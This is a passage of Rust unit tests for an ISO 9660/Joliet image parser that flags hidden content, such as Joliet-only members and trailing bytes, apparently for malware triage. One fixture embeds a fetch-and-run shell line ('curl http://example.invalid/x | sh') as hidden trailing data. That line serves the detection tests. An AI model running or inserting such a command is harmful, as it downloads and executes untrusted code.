    for (_, body, lba) in &jonly {
        put(*lba, body);
    }
    img.extend_from_slice(trailing);
    img
}

/// An ISO member is a verbatim run of sectors, so filefacts reports it with
/// the byte offset a caller can slice directly — no decompression involved.
/// The long Joliet name wins over the 8.3 ISO 9660 one, because that is the
/// name the mounting OS shows.
#[test]
fn iso_members_carry_sliceable_extents_and_joliet_names() {
    let iso = build_minimal_iso(
        &[
            ("INSTALL0", "Installer_x64.exe", b"MZ\x90\x00setup"),
            ("README", "ReadMe.txt", b"hello\n"),
        ],
        &[],
        "IMGBURN V2.5.8.0 - THE ULTIMATE IMAGE BURNER!",
        b"",
    );
    let parsed = open_with_path(std::path::Path::new("d.iso"), &iso).unwrap();
    assert_eq!(parsed.fileid().file_type(), FileType::Iso);

    let members = parsed.archive_members();
    let names: Vec<&str> = members.iter().map(|m| m.path.as_str()).collect();
    assert_eq!(names, vec!["Installer_x64.exe", "ReadMe.txt"]);

    let installer = &members[0];
    assert_eq!(installer.size_bytes, 9);
    let offset = installer
        .offsets
        .data
        .expect("contiguous member has an offset");
    assert_eq!(
        &iso[offset as usize..offset as usize + 9],
        b"MZ\x90\x00setup"
    );
    // Stored verbatim: no per-member codec to report.
    assert!(installer.compression.is_none());

    let v = parsed.values();
    assert_eq!(
        v.get("iso.format").and_then(|x| x.as_str()),
        Some("iso9660")
    );
    assert_eq!(
        v.get("iso.volume_id").and_then(|x| x.as_str()),
        Some("TESTVOL")
    );
    // The mastering tool is recovered from the PVD application identifier.
    assert_eq!(
        v.get("iso.builder").and_then(|x| x.as_str()),
        Some("imgburn")
    );
    assert_eq!(parsed.metrics().get("iso.file_count"), Some(2.0));
    assert_eq!(parsed.metrics().get("iso.executable_file_count"), Some(1.0));
}

/// ISO 9660 and Joliet are independent directory trees over the same sectors.
/// A member listed in only one of them is invisible to a reader that follows
/// the other, so both are walked and the results unioned by extent.
#[test]
fn iso_member_present_in_one_namespace_only_is_still_surfaced() {
    let iso = build_minimal_iso(
        &[("README", "ReadMe.txt", b"nothing to see\n")],
        &[("invoice.exe", b"MZ\x90\x00payload")],
        "",
        b"",
    );
    let parsed = open_with_path(std::path::Path::new("d.iso"), &iso).unwrap();

    let names: Vec<&str> = parsed
        .archive_members()
        .iter()
        .map(|m| m.path.as_str())
        .collect();
    assert!(
        names.contains(&"invoice.exe"),
        "Joliet-only member must survive the union: {names:?}"
    );

    let anomalies = parsed
        .values()
        .get("iso.anomalies")
        .cloned()
        .unwrap_or_default();
    let anomalies: Vec<&str> = anomalies.as_array().map_or(Vec::new(), |a| {
        a.iter().filter_map(|x| x.as_str()).collect()
    });
    assert!(
        anomalies.contains(&"tree-only-file"),
        "divergence is itself the finding: {anomalies:?}"
    );
    // No mastering tool stamped any identifier field.
    assert_eq!(
        parsed.metrics().get("iso.blank_identifier_fields"),
        Some(5.0)
    );
}

/// Bytes past the volume the descriptors declare belong to no file, so a walk
/// of the directory tree never reaches them. They are reported as an
/// unclaimed region with an offset, which is what lets a caller analyse them.
#[test]
fn iso_trailing_data_is_reported_as_an_unclaimed_member() {
    let payload = b"#!/bin/sh\ncurl http://example.invalid/x | sh\n";
    let iso = build_minimal_iso(&[("README", "ReadMe.txt", b"clean\n")], &[], "", payload);
    let parsed = open_with_path(std::path::Path::new("d.iso"), &iso).unwrap();

    assert_eq!(
        parsed.metrics().get("iso.trailing_bytes"),
        Some(payload.len() as f64)
    );
    let trailing = parsed
        .archive_members()
        .iter()
        .find(|m| m.entry_type.as_deref() == Some("trailing"))
        .cloned()
        .expect("trailing region is surfaced as a member");
    let offset = trailing
        .offsets
        .data
        .expect("trailing region is addressable") as usize;
    assert_eq!(&iso[offset..offset + payload.len()], payload);

    let anomalies = parsed
        .values()
        .get("iso.anomalies")
        .cloned()
        .unwrap_or_default();
    let anomalies: Vec<&str> = anomalies.as_array().map_or(Vec::new(), |a| {
        a.iter().filter_map(|x| x.as_str()).collect()
    });
    assert!(anomalies.contains(&"trailing-data"), "{anomalies:?}");
}

/// A well-formed image has no unclaimed interior space: the descriptors, path
/// tables, directory extents and file extents account for every sector. This
/// is the false-positive guard for the slack reporting above.
#[test]
fn iso_without_hidden_space_reports_no_slack() {
    let iso = build_minimal_iso(
        &[("README", "ReadMe.txt", b"clean\n")],
        &[],
        "MKISOFS ISO 9660/HFS FILESYSTEM BUILDER",
        b"",
    );
    let parsed = open_with_path(std::path::Path::new("d.iso"), &iso).unwrap();
    assert_eq!(parsed.metrics().get("iso.unallocated_bytes"), Some(0.0));
    assert_eq!(
        parsed.metrics().get("iso.unclaimed_region_count"),
        Some(0.0)
    );
    assert_eq!(
        parsed.values().get("iso.builder").and_then(|x| x.as_str()),
        Some("mkisofs")
    );
}
